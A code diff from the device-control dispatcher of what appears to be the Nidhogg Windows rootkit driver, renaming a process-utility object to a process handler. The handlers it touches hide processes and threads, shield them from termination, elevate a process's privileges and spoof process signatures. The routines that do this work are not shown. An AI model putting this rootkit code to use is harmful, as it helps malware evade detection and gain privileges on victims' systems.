@@ -91,14 +91,14 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		}
 
 		if (protectedProcess.Remove) {
-			if (!NidhoggProccessUtils->RemoveProcess(protectedProcess.Pid, ProcessType::Protected)) {
+			if (!NidhoggProcessHandler->RemoveProcess(protectedProcess.Pid, ProcessType::Protected)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid);
 		}
 		else {
-			if (!NidhoggProccessUtils->AddProtectedProcess(protectedProcess.Pid)) {
+			if (!NidhoggProcessHandler->AddProtectedProcess(protectedProcess.Pid)) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -116,7 +116,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			status = STATUS_UNSUCCESSFUL;
 			break;
 		}
-		NidhoggProccessUtils->ClearProcessList(ProcessType::Protected);
+		NidhoggProcessHandler->ClearProcessList(ProcessType::Protected);
 		break;
 	}
 
@@ -140,13 +140,13 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		}
 
 		if (hiddenProcess.Remove) {
-			status = NidhoggProccessUtils->UnhideProcess(hiddenProcess.Pid);
+			status = NidhoggProcessHandler->UnhideProcess(hiddenProcess.Pid);
 
 			if (NT_SUCCESS(status))
 				Print(DRIVER_PREFIX "Unhide process with pid %d.\n", hiddenProcess.Pid);
 		}
 		else {
-			status = NidhoggProccessUtils->HideProcess(hiddenProcess.Pid);
+			status = NidhoggProcessHandler->HideProcess(hiddenProcess.Pid);
 
 			if (NT_SUCCESS(status))
 				Print(DRIVER_PREFIX "Hid process with pid %d.\n", hiddenProcess.Pid);
@@ -173,7 +173,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggProccessUtils->ElevateProcess(pid);
+		status = NidhoggProcessHandler->ElevateProcess(pid);
 
 		if (NT_SUCCESS(status))
 			Print(DRIVER_PREFIX "Elevated process with pid %d.\n", pid);
@@ -203,7 +203,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		status = NidhoggProccessUtils->SetProcessSignature(&processSignature);
+		status = NidhoggProcessHandler->SetProcessSignature(&processSignature);
 
 		if (NT_SUCCESS(status))
 			Print(DRIVER_PREFIX "New signature applied to %d.\n", data->Pid);
@@ -226,7 +226,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			break;
 		}
 		auto data = static_cast<IoctlProcessList*>(Irp->AssociatedIrp.SystemBuffer);
-		NidhoggProccessUtils->ListProtectedProcesses(data);
+		NidhoggProcessHandler->ListProtectedProcesses(data);
 		len += size;
 		break;
 	}
@@ -257,15 +257,15 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 		}
 
 		if (protectedThread.Protect) {
-			if (NidhoggProccessUtils->GetProtectedThreadsCount() == MAX_TIDS) {
+			if (NidhoggProcessHandler->GetProtectedThreadsCount() == MAX_TIDS) {
 				status = STATUS_TOO_MANY_CONTEXT_IDS;
 				break;
 			}
 
-			if (NidhoggProccessUtils->FindThread(protectedThread.Tid))
+			if (NidhoggProcessHandler->FindThread(protectedThread.Tid))
 				break;
 
-			if (!NidhoggProccessUtils->AddThread(protectedThread.Tid)) {
+			if (!NidhoggProcessHandler->AddThread(protectedThread.Tid)) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
@@ -273,12 +273,12 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			Print(DRIVER_PREFIX "Protecting thread with tid %d.\n", protectedThread.Tid);
 		}
 		else {
-			if (NidhoggProccessUtils->GetProtectedThreadsCount() == 0) {
+			if (NidhoggProcessHandler->GetProtectedThreadsCount() == 0) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 
-			if (!NidhoggProccessUtils->RemoveThread(protectedThread.Tid)) {
+			if (!NidhoggProcessHandler->RemoveThread(protectedThread.Tid)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
@@ -306,7 +306,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
-		data->Hide ? NidhoggProccessUtils->HideThread(tid) : NidhoggProccessUtils->UnhideThread(tid);
+		data->Hide ? NidhoggProcessHandler->HideThread(tid) : NidhoggProcessHandler->UnhideThread(tid);
 
 		if (NT_SUCCESS(status)) {
 			data->Hide ? Print(DRIVER_PREFIX "Hid thread with tid %d.\n", tid) : 
@@ -325,7 +325,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			break;
 		}
 
-		NidhoggProccessUtils->ClearProtectedThreads();
+		NidhoggProcessHandler->ClearProtectedThreads();
 		break;
 	}
 
@@ -343,7 +343,7 @@ NTSTATUS NidhoggDeviceControl(_In_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp
 			break;
 		}
 		auto data = static_cast<OutputThreadsList*>(Irp->AssociatedIrp.SystemBuffer);
-		NidhoggProccessUtils->QueryProtectedThreads(data);
+		NidhoggProcessHandler->QueryProtectedThreads(data);
 
 		len += size;
 		break;
